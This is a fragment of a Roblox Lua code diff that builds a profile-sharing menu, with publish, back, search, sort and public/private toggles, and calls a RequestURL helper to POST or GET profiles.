+                create("TextLabel",{Parent=private,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='Private',TextColor3=Color3.fromRGB(68, 68, 68),TextSize=12})
+
+                local publishButton = create("TextButton",{Parent=CreateFrame,BackgroundColor3=Color3.fromHSV(vape.GUIColor.Hue,vape.GUIColor.Sat,vape.GUIColor.Value),Name='publish',Position=UDim2.fromOffset(15,59),Size=UDim2.fromOffset(158,44),Text=''})
+                createC(publishButton,UDim.new(0,4))
+                createS(publishButton,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
+                create("TextLabel",{Parent=publishButton,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='PUBLISH',TextColor3=Color3.fromRGB(255,255,255),TextSize=12})
+
+                local back =create("TextButton",{Parent=CreateFrame,BackgroundTransparency=1,BackgroundColor3=Color3.fromRGB(52, 52, 52),Name='back',Position=UDim2.fromOffset(15,398),Size=UDim2.fromOffset(158,44),Font=uipallet.Font,Text=''})
+                createC(back,UDim.new(0,4))
+                createS(back,"Border",UDim.new(0,0),"Outer",Color3.fromRGB(36, 34, 36),'Round','FixedSize',2,0)
+                create("TextLabel",{Parent=back,BackgroundTransparency=1,Position=UDim2.fromOffset(0,0),Size=UDim2.fromScale(1,1),Font=uipallet.Font,Text='BACK',TextColor3=Color3.fromRGB(68, 68, 68),TextSize=12})
+
+                for _, v in ipairs(Children:GetChildren()) do
+                    addProfile(v)
+                end
+
+                local function updateDisplay()
+                    local query = search.Text:lower()
+                    for _, profile in ipairs(profiles) do
+                        local match = profile.Name:lower():find(query) or profile.Username:lower():find(query)
+                        profile.Frame.Visible = match and true or false
+                    end
+                end
+
+                local function updatePN()
+                    Option.profileName = searchV2.Text
+                end
+
+                local function updateUN()
+                    Option.Username = searchV3.Text
+                end
+
+                search:GetPropertyChangedSignal("Text"):Connect(updateDisplay)
+
+                searchV2:GetPropertyChangedSignal("Text"):Connect(updatePN)
+
+                searchV3:GetPropertyChangedSignal("Text"):Connect(updateUN)
+
+
+                new.Activated:Connect(function()
+                    sorted = true
+                    sortProfiles(sorted)
+                    TweenController(new, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 0})
+                    TweenController(new.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(255, 255, 255)})
+                    TweenController(old, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+                    TweenController(old.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(68, 68, 68)})
+                end)
+
+                old.Activated:Connect(function()
+                    sorted = false
+                    sortProfiles(sorted)
+                    TweenController(new, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+                    TweenController(new.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(68, 68, 68)})
+                    TweenController(old, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 0})
+                    TweenController(old.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(255, 255, 255)})
+                end)
+                Children.ChildAdded:Connect(function(child)
+                    addProfile(child)
+                    updateDisplay()
+                end)
+                createButton.Activated:Connect(function()
+                    MainFrame.Visible = false
+                    CreateFrame.Visible = true
+                end)
+
+                back.Activated:Connect(function()
+                    MainFrame.Visible = true
+                    CreateFrame.Visible = false
+                end)
+
+                public.Activated:Connect(function()
+                    Option.See = true
+                    TweenController(public, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 0})
+                    TweenController(public.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(255, 255, 255)})
+                    TweenController(private, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+                    TweenController(private.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(68, 68, 68)})
+                end)
+
+                private.Activated:Connect(function()
+                    Option.See = false
+                    TweenController(public, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 1})
+                    TweenController(public.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(68, 68, 68)})
+                    TweenController(private, TweenInfo.new(0.95, Enum.EasingStyle.Sine), {BackgroundTransparency = 0})
+                    TweenController(private.TextLabel, TweenInfo.new(0.55, Enum.EasingStyle.Sine), {TextColor3 = Color3.fromRGB(255, 255, 255)})
+                end)
+
+                publishButton.Activated:Connect(function()
+                    updateUN()
+                    updatePN()
+                    updateProfiles()
+                    Option.created = os.date("%m/%d/%Y")
+                    RequestURL("POST")
+                end)
+
+                reloadButton.Activated:Connect(function()
+                    clearProfiles(Children)
+                    loading.Visible = true
+                    local max = math.random(1, 5)
+                    local current = 0
+
+                    local frames = {
+                        "LOADING",
+                        "LOADING.",
+                        "LOADING..",
+                        "LOADING...",
+                    }
+
+                    while task.wait(math.random(1,2)) do
+                        current += 1
+                        if current >= max then
+                            loading.Text = "LOADING.."
+                            task.wait(0.5)
+                            loading.Visible = false
+                            break
+                        end
+
+                        for _, frame in ipairs(frames) do
+                            loading.Text = frame
+                            task.wait(0.5)
+                        end
+                    end
+                    updateUN()
+                    updatePN()
+                    updateProfiles()
+                    Option.created = os.date("%m/%d/%Y")
+                    RequestURL("GET")
+                end)
+
+                sortProfiles(sorted)
+                loading.Visible = true
+                local max = math.random(1, 5)
+                local current = 0
+
+                local frames = {
+                    "LOADING",
+                    "LOADING.",
+                    "LOADING..",
+                    "LOADING...",
+                }
+
+                while task.wait(math.random(1,2)) do
+                    current += 1
+                    if current >= max then
+                        loading.Text = "LOADING.."
+                        task.wait(0.5)
+                        loading.Visible = false
+                        break
+                    end
+
+                    for _, frame in ipairs(frames) do
+                        loading.Text = frame
+                        task.wait(0.5)
+                    end
+                end
+                task.wait(1)
+                loading.Visible = false
+                RequestURL("GET")
+            else
+                RemoveUI()
+            end
+        end,
+    })
 end)
